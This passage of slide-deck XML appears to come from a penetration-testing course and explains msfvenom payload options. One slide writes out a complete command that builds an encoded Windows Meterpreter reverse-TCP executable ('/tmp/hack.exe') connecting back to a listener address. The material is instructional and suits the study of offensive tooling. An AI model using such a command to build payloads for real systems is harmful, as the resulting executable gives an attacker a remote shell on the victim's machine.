                      <a:r>
                        <a:rPr lang="en" sz="1800">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Maximum size of the payload</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="0" marB="0" marR="91425" marL="18287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1"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="483600">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>-i:</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700"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lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1800">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Number of iterations with which to encode the payload</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="0" marB="0" marR="91425" marL="18287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r>
              <a:tr h="483600">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>-x:</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700"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lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1800">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Custom executable file to use as a template</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="0" marB="0" marR="91425" marL="18287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483600">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>-o:</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700"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lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1800">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Output file to be created, specifying its name and location</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="0" marB="0" marR="91425" marL="18287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73"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3145525" y="1315650"/>
            <a:ext cx="5555100" cy="258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Now we’ll cover the basics of</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en" sz="4200">
                <a:latin typeface="Inconsolata ExtraBold"/>
                <a:ea typeface="Inconsolata ExtraBold"/>
                <a:cs typeface="Inconsolata ExtraBold"/>
                <a:sym typeface="Inconsolata ExtraBold"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>custom payload command options.</a:t>
            </a:r>
            <a:endParaRPr>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4" name="Shape 544"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="545" name="Google Shape;545;p74"/>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546" name="Google Shape;546;p74"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="375309" y="88291"/>
            <a:ext cx="9144000" cy="3936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b="0" lang="en" sz="2800">
                <a:latin typeface="Inconsolata ExtraBold"/>
                <a:ea typeface="Inconsolata ExtraBold"/>
                <a:cs typeface="Inconsolata ExtraBold"/>
                <a:sym typeface="Inconsolata ExtraBold"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:rPr>
              <a:t> Command Syntax</a:t>
            </a:r>
            <a:endParaRPr b="0" sz="2800">
              <a:latin typeface="Inconsolata ExtraBold"/>
              <a:ea typeface="Inconsolata ExtraBold"/>
              <a:cs typeface="Inconsolata ExtraBold"/>
              <a:sym typeface="Inconsolata ExtraBold"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="547" name="Google Shape;547;p74"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="194550" y="2493088"/>
            <a:ext cx="8754900" cy="655500"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 10369" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="lt2"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1050">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1050">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1050">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent3"/>
                </a:highlight>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>-p</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1050">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1050">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>windows/meterpreter/reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1050">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1050">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent3"/>
                </a:highlight>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>-a x86</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1050">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1050">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>-e x86/shikata_ga_nai</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1050">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1050">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent3"/>
                </a:highlight>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>-f exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1050">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1050">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>-o /tmp/hack.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1050">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t> LHOST=192.168.0.8 LPORT=4444</a:t>
            </a:r>
            <a:endParaRPr sz="1050">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Inconsolata Medium"/>
              <a:ea typeface="Inconsolata Medium"/>
              <a:cs typeface="Inconsolata Medium"/>
              <a:sym typeface="Inconsolata Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="548" name="Google Shape;548;p74"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="343550" y="1005050"/>
            <a:ext cx="1834500" cy="444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a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>m</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>sfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>launches the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> program.</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="549" name="Google Shape;549;p74"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1015850" y="3455800"/>
            <a:ext cx="1569900" cy="273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a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent3"/>
                </a:highlight>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>p</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:br>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>indicates payload.</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="550" name="Google Shape;550;p74"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1250525" y="1826350"/>
            <a:ext cx="2785500" cy="3612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rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>windows/meterpreter/reverse_tcp</a:t>
            </a:r>
            <a:endParaRPr b="1">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:highlight>
                <a:schemeClr val="accent1"/>
              </a:highlight>
              <a:latin typeface="Inconsolata"/>
              <a:ea typeface="Inconsolata"/>
              <a:cs typeface="Inconsolata"/>
              <a:sym typeface="Inconsolata"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>is the Metasploit command module.</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="551" name="Google Shape;551;p74"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3262550" y="3455800"/>
            <a:ext cx="1320300" cy="1065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a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent3"/>
                </a:highlight>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>-a </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent3"/>
                </a:highlight>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent3"/>
                </a:highlight>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>86</a:t>
            </a:r>
            <a:endParaRPr b="1">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:schemeClr val="accent3"/>
              </a:highlight>
              <a:latin typeface="Inconsolata"/>
              <a:ea typeface="Inconsolata"/>
              <a:cs typeface="Inconsolata"/>
              <a:sym typeface="Inconsolata"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>designates the architecture we’ll</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>use. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>x86</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> is default.</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="552" name="Google Shape;552;p74"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3349425" y="1005050"/>
            <a:ext cx="2302200" cy="361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a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>-e x86/shikata_ga_nai</a:t>
            </a:r>
            <a:endParaRPr b="1">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:highlight>
                <a:schemeClr val="accent1"/>
              </a:highlight>
              <a:latin typeface="Inconsolata"/>
              <a:ea typeface="Inconsolata"/>
              <a:cs typeface="Inconsolata"/>
              <a:sym typeface="Inconsolata"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
